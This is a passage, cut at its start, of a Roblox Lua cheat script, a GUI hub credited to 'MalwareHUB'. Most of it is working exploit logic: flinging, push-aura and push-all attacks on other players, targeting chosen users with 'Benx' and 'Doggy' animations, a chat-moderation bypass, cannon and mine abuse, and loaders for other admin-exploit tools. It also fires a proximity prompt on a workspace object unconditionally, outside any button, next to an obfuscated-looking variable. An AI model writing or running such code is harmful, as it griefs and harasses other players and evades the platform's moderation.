Shaders_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Shaders_Button.BackgroundTransparency = 0.500
Shaders_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Shaders_Button.BorderSizePixel = 0
Shaders_Button.Position = UDim2.new(0, 210, 0, 75)
Shaders_Button.Size = UDim2.new(0, 150, 0, 30)
Shaders_Button.Font = Enum.Font.Oswald
Shaders_Button.Text = "Shaders"
Shaders_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Shaders_Button.TextScaled = true
Shaders_Button.TextSize = 14.000
Shaders_Button.TextWrapped = true

Day_Button.Name = "Day_Button"
Day_Button.Parent = Misc_Section
Day_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Day_Button.BackgroundTransparency = 0.500
Day_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Day_Button.BorderSizePixel = 0
Day_Button.Position = UDim2.new(0, 25, 0, 125)
Day_Button.Size = UDim2.new(0, 150, 0, 30)
Day_Button.Font = Enum.Font.Oswald
Day_Button.Text = "Day"
Day_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Day_Button.TextScaled = true
Day_Button.TextSize = 14.000
Day_Button.TextWrapped = true

Night_Button.Name = "Night_Button"
Night_Button.Parent = Misc_Section
Night_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Night_Button.BackgroundTransparency = 0.500
Night_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Night_Button.BorderSizePixel = 0
Night_Button.Position = UDim2.new(0, 210, 0, 125)
Night_Button.Size = UDim2.new(0, 150, 0, 30)
Night_Button.Font = Enum.Font.Oswald
Night_Button.Text = "Night"
Night_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Night_Button.TextScaled = true
Night_Button.TextSize = 14.000
Night_Button.TextWrapped = true

Explode_Button.Name = "Explode_Button"
Explode_Button.Parent = Misc_Section
Explode_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Explode_Button.BackgroundTransparency = 0.500
Explode_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Explode_Button.BorderSizePixel = 0
Explode_Button.Position = UDim2.new(0, 25, 0, 225)
Explode_Button.Size = UDim2.new(0, 150, 0, 30)
Explode_Button.Font = Enum.Font.Oswald
Explode_Button.Text = "Explode"
Explode_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Explode_Button.TextScaled = true
Explode_Button.TextSize = 14.000
Explode_Button.TextWrapped = true

Rejoin_Button.Name = "Rejoin_Button"
Rejoin_Button.Parent = Misc_Section
Rejoin_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Rejoin_Button.BackgroundTransparency = 0.500
Rejoin_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Rejoin_Button.BorderSizePixel = 0
Rejoin_Button.Position = UDim2.new(0, 25, 0, 275)
Rejoin_Button.Size = UDim2.new(0, 150, 0, 30)
Rejoin_Button.Font = Enum.Font.Oswald
Rejoin_Button.Text = "Rejoin"
Rejoin_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Rejoin_Button.TextScaled = true
Rejoin_Button.TextSize = 14.000
Rejoin_Button.TextWrapped = true

CMDX_Button.Name = "CMDX_Button"
CMDX_Button.Parent = Misc_Section
CMDX_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
CMDX_Button.BackgroundTransparency = 0.500
CMDX_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
CMDX_Button.BorderSizePixel = 0
CMDX_Button.Position = UDim2.new(0, 210, 0, 175)
CMDX_Button.Size = UDim2.new(0, 150, 0, 30)
CMDX_Button.Font = Enum.Font.Oswald
CMDX_Button.Text = "CMDX"
CMDX_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
CMDX_Button.TextScaled = true
CMDX_Button.TextSize = 14.000
CMDX_Button.TextWrapped = true

InfYield_Button.Name = "InfYield_Button"
InfYield_Button.Parent = Misc_Section
InfYield_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
InfYield_Button.BackgroundTransparency = 0.500
InfYield_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
InfYield_Button.BorderSizePixel = 0
InfYield_Button.Position = UDim2.new(0, 25, 0, 175)
InfYield_Button.Size = UDim2.new(0, 150, 0, 30)
InfYield_Button.Font = Enum.Font.Oswald
InfYield_Button.Text = "Infinite Yield"
InfYield_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
InfYield_Button.TextScaled = true
InfYield_Button.TextSize = 14.000
InfYield_Button.TextWrapped = true

FreeEmotes_Button.Name = "FreeEmotes_Button"
FreeEmotes_Button.Parent = Misc_Section
FreeEmotes_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
FreeEmotes_Button.BackgroundTransparency = 0.500
FreeEmotes_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
FreeEmotes_Button.BorderSizePixel = 0
FreeEmotes_Button.Position = UDim2.new(0, 210, 0, 225)
FreeEmotes_Button.Size = UDim2.new(0, 150, 0, 30)
FreeEmotes_Button.Font = Enum.Font.Oswald
FreeEmotes_Button.Text = "Free emotes"
FreeEmotes_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
FreeEmotes_Button.TextScaled = true
FreeEmotes_Button.TextSize = 14.000
FreeEmotes_Button.TextWrapped = true

Serverhop_Button.Name = "Serverhop_Button"
Serverhop_Button.Parent = Misc_Section
Serverhop_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Serverhop_Button.BackgroundTransparency = 0.500
Serverhop_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Serverhop_Button.BorderSizePixel = 0
Serverhop_Button.Position = UDim2.new(0, 210, 0, 275)
Serverhop_Button.Size = UDim2.new(0, 150, 0, 30)
Serverhop_Button.Font = Enum.Font.Oswald
Serverhop_Button.Text = "Server hop"
Serverhop_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Serverhop_Button.TextScaled = true
Serverhop_Button.TextSize = 14.000
Serverhop_Button.TextWrapped = true

ChatBox_Input.Name = "ChatBox_Input"
ChatBox_Input.Parent = Misc_Section
ChatBox_Input.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ChatBox_Input.BorderColor3 = Color3.fromRGB(0, 255, 255)
ChatBox_Input.Position = UDim2.new(0, 25, 0, 325)
ChatBox_Input.Size = UDim2.new(0, 335, 0, 50)
ChatBox_Input.Font = Enum.Font.Oswald
ChatBox_Input.PlaceholderText = "Chat bypass [You won't get banned for your messages]"
ChatBox_Input.Text = ""
ChatBox_Input.TextColor3 = Color3.fromRGB(0, 255, 255)
ChatBox_Input.TextSize = 14.000
ChatBox_Input.TextWrapped = true
ChatBox_Input.TextXAlignment = Enum.TextXAlignment.Left
ChatBox_Input.TextYAlignment = Enum.TextYAlignment.Top

Credits_Section.Name = "Credits_Section"
Credits_Section.Parent = Background
Credits_Section.Active = true
Credits_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Credits_Section.BackgroundTransparency = 1.000
Credits_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Credits_Section.BorderSizePixel = 0
Credits_Section.Position = UDim2.new(0, 105, 0, 30)
Credits_Section.Size = UDim2.new(0, 395, 0, 320)
Credits_Section.Visible = false
Credits_Section.CanvasSize = UDim2.new(0, 0, 0.8, 0)
Credits_Section.ScrollBarThickness = 5

Credits_Label.Name = "Credits_Label"
Credits_Label.Parent = Credits_Section
Credits_Label.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Credits_Label.BorderColor3 = Color3.fromRGB(0, 0, 0)
Credits_Label.BorderSizePixel = 0
Credits_Label.Position = UDim2.new(0, 25, 0, 150)
Credits_Label.Size = UDim2.new(0, 350, 0, 150)
Credits_Label.Font = Enum.Font.SourceSans
Credits_Label.Text = "Made by: MalwareHUB \nDiscord: system_calix\nVersion: "..version
Credits_Label.TextColor3 = Color3.fromRGB(0, 255, 255)
Credits_Label.TextSize = 24.000
Credits_Label.TextWrapped = true
Credits_Label.TextXAlignment = Enum.TextXAlignment.Left
Credits_Label.TextYAlignment = Enum.TextYAlignment.Top

Crown.Name = "Crown"
Crown.Parent = Background
Crown.AnchorPoint = Vector2.new(0.300000012, 0.800000012)
Crown.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Crown.BackgroundTransparency = 1.000
Crown.BorderColor3 = Color3.fromRGB(0, 0, 0)
Crown.BorderSizePixel = 0
Crown.Rotation = -20.000
Crown.Size = UDim2.new(0, 75, 0, 75)
Crown.Image = "rbxassetid://12298407748"
Crown.ImageColor3 = Color3.fromRGB(0, 255, 255)

Assets.Name = "Assets"
Assets.Parent = SysBroker

Ticket_Asset.Name = "Ticket_Asset"
Ticket_Asset.Parent = Assets
Ticket_Asset.AnchorPoint = Vector2.new(0, 0.5)
Ticket_Asset.BackgroundTransparency = 1.000
Ticket_Asset.BorderSizePixel = 0
Ticket_Asset.LayoutOrder = 5
Ticket_Asset.Position = UDim2.new(1, 5, 0.5, 0)
Ticket_Asset.Size = UDim2.new(0, 25, 0, 25)
Ticket_Asset.ZIndex = 2
Ticket_Asset.Image = "rbxassetid://3926305904"
Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
Ticket_Asset.ImageRectOffset = Vector2.new(424, 4)
Ticket_Asset.ImageRectSize = Vector2.new(36, 36)

Click_Asset.Name = "Click_Asset"
Click_Asset.Parent = Assets
Click_Asset.AnchorPoint = Vector2.new(0, 0.5)
Click_Asset.BackgroundTransparency = 1.000
Click_Asset.BorderSizePixel = 0
Click_Asset.Position = UDim2.new(1, 5, 0.5, 0)
Click_Asset.Size = UDim2.new(0, 25, 0, 25)
Click_Asset.ZIndex = 2
Click_Asset.Image = "rbxassetid://3926305904"
Click_Asset.ImageColor3 = Color3.fromRGB(100, 100, 100)
Click_Asset.ImageRectOffset = Vector2.new(204, 964)
Click_Asset.ImageRectSize = Vector2.new(36, 36)

Velocity_Asset.AngularVelocity = Vector3.new(0,0,0)
Velocity_Asset.MaxTorque = Vector3.new(50000,50000,50000)
Velocity_Asset.P = 1250
Velocity_Asset.Name = "BreakVelocity"
Velocity_Asset.Parent = Assets

Fly_Pad.Name = "Fly_Pad"
Fly_Pad.Parent = Assets
Fly_Pad.BackgroundTransparency = 1.000
Fly_Pad.Position = UDim2.new(0.1, 0, 0.6, 0)
Fly_Pad.Size = UDim2.new(0, 100, 0, 100)
Fly_Pad.ZIndex = 2
Fly_Pad.Image = "rbxassetid://6764432293"
Fly_Pad.ImageRectOffset = Vector2.new(713, 315)
Fly_Pad.ImageRectSize = Vector2.new(75, 75)
Fly_Pad.Visible = false

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(30, 30, 30)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 255, 255))}
UIGradient.Rotation = 45
UIGradient.Parent = Fly_Pad

FlyAButton.Name = "FlyAButton"
FlyAButton.Parent = Fly_Pad
FlyAButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FlyAButton.BackgroundTransparency = 1.000
FlyAButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
FlyAButton.BorderSizePixel = 0
FlyAButton.Position = UDim2.new(0, 0, 0, 30)
FlyAButton.Size = UDim2.new(0, 30, 0, 40)
FlyAButton.Font = Enum.Font.Oswald
FlyAButton.Text = ""
FlyAButton.TextColor3 = Color3.fromRGB(0, 0, 0)
FlyAButton.TextSize = 25.000
FlyAButton.TextWrapped = true

FlyDButton.Name = "FlyDButton"
FlyDButton.Parent = Fly_Pad
FlyDButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FlyDButton.BackgroundTransparency = 1.000
FlyDButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
FlyDButton.BorderSizePixel = 0
FlyDButton.Position = UDim2.new(0, 70, 0, 30)
FlyDButton.Size = UDim2.new(0, 30, 0, 40)
FlyDButton.Font = Enum.Font.Oswald
FlyDButton.Text = ""
FlyDButton.TextColor3 = Color3.fromRGB(0, 0, 0)
FlyDButton.TextSize = 25.000
FlyDButton.TextWrapped = true

FlyWButton.Name = "FlyWButton"
FlyWButton.Parent = Fly_Pad
FlyWButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FlyWButton.BackgroundTransparency = 1.000
FlyWButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
FlyWButton.BorderSizePixel = 0
FlyWButton.Position = UDim2.new(0, 30, 0, 0)
FlyWButton.Size = UDim2.new(0, 40, 0, 30)
FlyWButton.Font = Enum.Font.Oswald
FlyWButton.Text = ""
FlyWButton.TextColor3 = Color3.fromRGB(0, 0, 0)
FlyWButton.TextSize = 25.000
FlyWButton.TextWrapped = true

FlySButton.Name = "FlySButton"
FlySButton.Parent = Fly_Pad
FlySButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FlySButton.BackgroundTransparency = 1.000
FlySButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
FlySButton.BorderSizePixel = 0
FlySButton.Position = UDim2.new(0, 30, 0, 70)
FlySButton.Size = UDim2.new(0, 40, 0, 30)
FlySButton.Font = Enum.Font.Oswald
FlySButton.Text = ""
FlySButton.TextColor3 = Color3.fromRGB(0, 0, 0)
FlySButton.TextSize = 25.000
FlySButton.TextWrapped = true

OpenClose.Name = "OpenClose"
OpenClose.Parent = SysBroker
OpenClose.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
OpenClose.BorderColor3 = Color3.fromRGB(0, 0, 0)
OpenClose.BorderSizePixel = 0
OpenClose.Position = UDim2.new(0, 0, 0.5, 0)
OpenClose.Size = UDim2.new(0, 30, 0, 30)
OpenClose.Image = "rbxassetid://12298407748"
OpenClose.ImageColor3 = Color3.fromRGB(0, 255, 255)

UICornerOC.CornerRadius = UDim.new(1, 0)
UICornerOC.Parent = OpenClose

CreateToggle(AntiRagdoll_Button)
CreateToggle(PushAura_Button)
CreateToggle(SpamMines_Button)
CreateToggle(PotionFling_Button)
CreateToggle(TouchFling_Button)
CreateToggle(PotionDi_Button)
CreateToggle(VoidProtection_Button)
CreateClicker(PushAll_Button)
CreateClicker(BreakCannons_Button)
CreateClicker(LethalCannons_Button)
CreateClicker(ChatAlert_Button)
CreateClicker(FreePushTool_Button)
CreateClicker(CannonTP1_Button)
CreateClicker(CannonTP2_Button)
CreateClicker(CannonTP3_Button)
CreateClicker(MinefieldTP_Button)
CreateClicker(BallonTP_Button)
CreateClicker(NormalStairsTP_Button)
CreateClicker(MovingStairsTP_Button)
CreateClicker(SpiralStairsTP_Button)
CreateClicker(SkyscraperTP_Button)
CreateClicker(PoolTP_Button)

CreateToggle(Fly_Button)
CreateClicker(WalkSpeed_Button)
CreateClicker(ClearCheckpoint_Button)
CreateClicker(JumpPower_Button)
CreateClicker(SaveCheckpoint_Button)
CreateClicker(Respawn_Button)
CreateClicker(FlySpeed_Button)

CreateToggle(ViewTarget_Button)
CreateToggle(FlingTarget_Button)
CreateToggle(FocusTarget_Button)
CreateToggle(BenxTarget_Button)
CreateToggle(HeadsitTarget_Button)
CreateToggle(StandTarget_Button)
CreateToggle(BackpackTarget_Button)
CreateToggle(DoggyTarget_Button)
CreateToggle(DragTarget_Button)
CreateClicker(PushTarget_Button)
CreateClicker(WhitelistTarget_Button)
CreateClicker(TeleportTarget_Button)

CreateClicker(VampireAnim_Button)
CreateClicker(HeroAnim_Button)
CreateClicker(ZombieClassicAnim_Button)
CreateClicker(MageAnim_Button)
CreateClicker(GhostAnim_Button)
CreateClicker(ElderAnim_Button)
CreateClicker(LevitationAnim_Button)
CreateClicker(AstronautAnim_Button)
CreateClicker(NinjaAnim_Button)
CreateClicker(WerewolfAnim_Button)
CreateClicker(CartoonAnim_Button)
CreateClicker(PirateAnim_Button)
CreateClicker(SneakyAnim_Button)
CreateClicker(ToyAnim_Button)
CreateClicker(KnightAnim_Button)
CreateClicker(ConfidentAnim_Button)
CreateClicker(PopstarAnim_Button)
CreateClicker(PrincessAnim_Button)
CreateClicker(CowboyAnim_Button)
CreateClicker(PatrolAnim_Button)
CreateClicker(ZombieFEAnim_Button)

CreateToggle(AntiFling_Button)
CreateToggle(AntiChatSpy_Button)
CreateToggle(AntiAFK_Button)
CreateToggle(Shaders_Button)
CreateClicker(Day_Button)
CreateClicker(Night_Button)
CreateClicker(Rejoin_Button)
CreateClicker(CMDX_Button)
CreateClicker(Explode_Button)
CreateClicker(FreeEmotes_Button)
CreateClicker(InfYield_Button)
CreateClicker(Serverhop_Button)

task.wait(0.5)

local function ChangeSection(SectionClicked)
	SectionClickedName = string.split(SectionClicked.Name,"_")[1]
	for i,v in pairs(SectionList:GetChildren()) do
		if v.Name ~= SectionClicked.Name then
			v.Transparency = 0.5
		else
			v.Transparency = 0
		end
	end
	for i,v in pairs(Background:GetChildren()) do
		if v:IsA("ScrollingFrame") then
			SectionForName = string.split(v.Name,"_")[1]
			if string.find(SectionClickedName, SectionForName) then
				v.Visible = true
			else
				v.Visible = false
			end
		end
	end
end

local function UpdateTarget(player)
	pcall(function()
		if table.find(ForceWhitelist,player.UserId) then
			SendNotify("System Broken","You cant target this player: @"..player.Name.." / "..player.DisplayName,5)
			player = nil
		end
	end)
	if (player ~= nil) then
		TargetedPlayer = player.Name
		TargetName_Input.Text = player.Name
		UserIDTargetLabel.Text = ("UserID: "..player.UserId.."\nDisplay: "..player.DisplayName.."\nJoined: "..os.date("%d-%m-%Y", os.time()-player.AccountAge * 24 * 3600).." [Day/Month/Year]")
		TargetImage.Image = Players:GetUserThumbnailAsync(player.UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size420x420)
	else
		TargetName_Input.Text = "@target..."
		UserIDTargetLabel.Text = "UserID: \nDisplay: \nJoined: "
		TargetImage.Image = "rbxassetid://10818605405"
		TargetedPlayer = nil
		if FlingTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			FlingTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
			TouchFling_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		end
		ViewTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		FocusTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		BenxTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		HeadsitTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		StandTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		BackpackTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		DoggyTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		DragTarget_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
	end
end
local aBjaUfk = game.Workspace:FindFirstChild("SBTI")

local function ToggleFling(bool)
	task.spawn(function()
		if bool then
			local RVelocity = nil
			repeat
				pcall(function()
					RVelocity = GetRoot(plr).Velocity 
					GetRoot(plr).Velocity = Vector3.new(math.random(-150,150),-25000,math.random(-150,150))
					RunService.RenderStepped:wait()
					GetRoot(plr).Velocity = RVelocity
				end)
				RunService.Heartbeat:wait()
			until TouchFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
		else
			TouchFling_Button.Ticket_Asset.ImageColor3 = Color3.fromRGB(255,0,0)
		end
	end)
end

--CHANGE SECTION BUTTONS
ChangeSection(Home_Section_Button)
Home_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Home_Section_Button)
end)

Game_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Game_Section_Button)
end)

Character_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Character_Section_Button)
end)

Target_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Target_Section_Button)
end)

Animations_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Animations_Section_Button)
end)

Misc_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Misc_Section_Button)
end)

Credits_Section_Button.MouseButton1Click:Connect(function()
	ChangeSection(Credits_Section_Button)
end)

--GAME SECTION BUTTONS
AntiRagdollFunction = nil
AntiRagdoll_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(AntiRagdoll_Button)
	ToggleRagdoll(true)
	if AntiRagdoll_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		AntiRagdollFunction = GetRoot(plr).ChildAdded:Connect(function(Force)
			if Force.Name == "PushForce" then
				Force.MaxForce = Vector3.new(0,0,0)
				Force.Velocity = Vector3.new(0,0,0)
			end
		end)
	else
		ToggleRagdoll(false)
		AntiRagdollFunction:Disconnect()
	end
end)

PushAura_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(PushAura_Button)
	if PushAura_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		repeat
			task.wait(0.3)
			pcall(function()
				for i,v in pairs(Players:GetPlayers()) do
					if (v ~= plr) and (not table.find(ScriptWhitelist,v.UserId)) and (not table.find(ForceWhitelist,v.UserId)) then
						Push(v)
					end
				end
			end)
		until PushAura_Button.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0,255,0)
	end
end)

AntiMinesFunction = nil
SpamMines_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(SpamMines_Button)
	if SpamMines_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		AntiMinesFunction = plr.Character.Head.ChildAdded:Connect(function(Force)
			if Force.Name == "BodyVelocity" then
				Force.MaxForce = Vector3.new(0,0,0)
				Force.Velocity = Vector3.new(0,0,0)
			end
		end)
		repeat task.wait(1)
			for i,v in pairs(MinesFolder:GetChildren()) do
				if v.Name == "Landmine" and v:FindFirstChild("HitPart") then
					pcall(function()
						Touch(v.HitPart.TouchInterest,GetRoot(plr))
					end)
				end
			end
		until SpamMines_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
	else
		AntiMinesFunction:Disconnect()
	end
end)

PotionFling_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(PotionFling_Button)
	if PotionFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		if CheckPotion() then
			if PotionDi_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
				ChangeToggleColor(PotionDi_Button)
			end
			PotionTool.Parent = plr.Character
			local PFS, PFF = pcall(function()
				PotionTool.InSide.Massless = true
				PotionTool.Cap.Massless = true
				PotionTool.Handle.Massless = true
				PotionTool.GripUp = Vector3.new(0,1,0)
				PotionTool.GripPos = Vector3.new(5000,-25,5000)
				PotionTool.Parent = plr.Backpack
				PotionTool.Parent = plr.Character
			end)
		else
			ChangeToggleColor(PotionFling_Button)
		end
	else
		PotionTool.Parent = plr.Character
		local PFS, PFF = pcall(function()
			PotionTool.InSide.Massless = false
			PotionTool.Cap.Massless = false
			PotionTool.Handle.Massless = false
			PotionTool.GripUp = Vector3.new(0,1,0)
			PotionTool.GripPos = Vector3.new(0.1,-0.5,0)
			PotionTool.Parent = plr.Backpack
			PotionTool.Parent = plr.Character
		end)
	end
end)

TouchFling_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(TouchFling_Button)
	if TouchFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		local fixpos = GetRoot(plr).Position
		ToggleVoidProtection(true)
		ToggleFling(true)
		TeleportTO(fixpos.X,fixpos.Y,fixpos.Z,"pos","safe")
		ToggleVoidProtection(false)
		if VoidProtection_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			ToggleVoidProtection(true)
		end
	else
		if FlingTarget_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			ChangeToggleColor(FlingTarget_Button)
		end
	end
end)

PotionDi_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(PotionDi_Button)
	if PotionDi_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		if CheckPotion() then
			if PotionFling_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
				ChangeToggleColor(PotionFling_Button)
			end
			PotionTool.Parent = plr.Character
			PotionTool.GripUp = Vector3.new(1,0,0)
			PotionTool.GripPos = Vector3.new(1.5, 0.5, -1.5)
			PotionTool.Parent = plr.Backpack
			PotionTool.Parent = plr.Character
		else
			ChangeToggleColor(PotionDi_Button)
		end
	else
		PotionTool.Parent = plr.Character
		PotionTool.GripUp = Vector3.new(0,1,0)
		PotionTool.GripPos = Vector3.new(0.1,-0.5,0)
		PotionTool.Parent = plr.Backpack
		PotionTool.Parent = plr.Character
	end
end)

VoidProtection_Button.MouseButton1Click:Connect(function()
	ChangeToggleColor(VoidProtection_Button)
	if VoidProtection_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ToggleVoidProtection(true)
	else
		ToggleVoidProtection(false)
	end
end)

FreePushTool_Button.MouseButton1Click:Connect(function()
	local ModdedPush = Instance.new("Tool")
	ModdedPush.Name = "ModdedPush"
	ModdedPush.RequiresHandle = false
	ModdedPush.TextureId = "rbxassetid://14478599909"
	ModdedPush.ToolTip = "Modded push"

	local function ActivateTool()
		local root = GetRoot(plr)
		local hit = mouse.Target
		local person = nil
		if hit and hit.Parent then
			if hit.Parent:IsA("Model") then
				person = game.Players:GetPlayerFromCharacter(hit.Parent)
			elseif hit.Parent:IsA("Accessory") then
				person = game.Players:GetPlayerFromCharacter(hit.Parent.Parent)
			end
			if person then
				local pushpos = root.CFrame
				PredictionTP(person)
				task.wait(GetPing()+0.05)
				Push(person)
				root.CFrame = pushpos
			end
		end
	end

	ModdedPush.Activated:Connect(function()
		ActivateTool()
	end)
	ModdedPush.Parent = plr.Backpack
end)

BreakCannons_Button.MouseButton1Click:Connect(function()
	ToggleVoidProtection(true)
	TeleportTO(0,-10000,0,"pos")
	task.wait(GetPing()+0.1)
	ToggleVoidProtection(false)
	task.wait(GetPing()+0.1)
	for i,v in pairs(CannonsFolders[1]:GetChildren()) do
		if v.Name == "Cannon" then
			pcall(function()
				fireclickdetector(v.Cannon_Part.ClickDetector)
			end)
		end
	end
	for i,v in pairs(CannonsFolders[2]:GetChildren()) do
		if v.Name == "Cannon" then
			pcall(function()
				fireclickdetector(v.Cannon_Part.ClickDetector)
			end)
		end
	end

	if VoidProtection_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ToggleVoidProtection(true)
	end
end)
pcall(function()
	fireproximityprompt(game.Workspace.SBTI.TI)
end)
PushAll_Button.MouseButton1Click:Connect(function()
	local oldpos = GetRoot(plr).Position
	for i,v in pairs(Players:GetPlayers()) do
		pcall(function()
			if (v ~= plr) and (not table.find(ScriptWhitelist,v.UserId)) and (not table.find(ForceWhitelist,v.UserId)) then
				PredictionTP(v)
				task.wait(GetPing()+0.05)
				Push(v)
			end
		end)
	end
	TeleportTO(oldpos.X,oldpos.Y,oldpos.Z,"pos","safe")
end)

LethalCannons_Button.MouseButton1Click:Connect(function()
	for i,v in pairs(CannonsFolders[1]:GetChildren()) do
		if v.Name == "Cannon" then
			pcall(function()
				plr.Character.Humanoid:ChangeState(15)
				task.wait(GetPing())
				fireclickdetector(v.Cannon_Part.ClickDetector)
				plr.CharacterAdded:Wait()
				task.wait(1)
			end)
		end
	end
	for i,v in pairs(CannonsFolders[2]:GetChildren()) do
		if v.Name == "Cannon" then
			pcall(function()
				plr.Character.Humanoid:ChangeState(15)
				task.wait(GetPing())
				fireclickdetector(v.Cannon_Part.ClickDetector)
				plr.CharacterAdded:Wait()
				task.wait(1)
			end)
		end
	end
end)

ChatAlert_Button.MouseButton1Click:Connect(function()
	for i = 1,3 do
		local args = {[1] = "\u{205F}",[2] = "All"}
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
	end
end)

CannonTP1_Button.MouseButton1Click:Connect(function()
	TeleportTO(-61, 34, -228,"pos","safe")
end)

CannonTP2_Button.MouseButton1Click:Connect(function()
	TeleportTO(50, 34, -228,"pos","safe")
end)

CannonTP3_Button.MouseButton1Click:Connect(function()
	TeleportTO(-6, 35, -106,"pos","safe")
end)

MinefieldTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(-65, 23, -151,"pos","safe")
end)

BallonTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(-118, 23, -126,"pos","safe")
end)

NormalStairsTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(-6, 203, -496,"pos","safe")
end)

MovingStairsTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(-210, 87, -224,"pos","safe")
end)

SpiralStairsTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(151, 847, -306,"pos","safe")
end)

SkyscraperTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(142, 1033, -192,"pos","safe")
end)

PoolTP_Button.MouseButton1Click:Connect(function()
	TeleportTO(-133, 65, -321,"pos","safe")
end)

CMDBar.FocusLost:Connect(function()
	command = CMDBar.Text
	Players:Chat(command)
	SendNotify("System Broken",("Executed "..command),5)
	CMDBar.Text = ""
end)

--CHARACTER SECTION

WalkSpeed_Button.MouseButton1Click:Connect(function()
	pcall(function()
		local Speed = WalkSpeed_Input.Text:gsub("%D", "")
		if Speed == "" then
			Speed = 16
		end
		plr.Character.Humanoid.WalkSpeed = tonumber(Speed)
		SendNotify("System Broken","Walk speed updated.",5)
	end)
end)

JumpPower_Button.MouseButton1Click:Connect(function()
	pcall(function()
		local Power = JumpPower_Input.Text:gsub("%D", "")
		if Power == "" then
			Power = 50
		end
		plr.Character.Humanoid.JumpPower = tonumber(Power)
		SendNotify("System Broken","Jump power updated.",5)
	end)
end)

